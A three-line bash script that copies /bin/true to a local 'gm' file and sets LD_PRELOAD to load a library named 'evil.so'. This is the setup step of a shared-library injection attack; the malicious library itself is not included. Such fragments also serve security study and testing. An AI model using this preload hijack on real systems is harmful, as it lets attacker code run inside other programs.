#!/bin/bash
cp /bin/true ./gm
export LD_PRELOAD=./evil.so

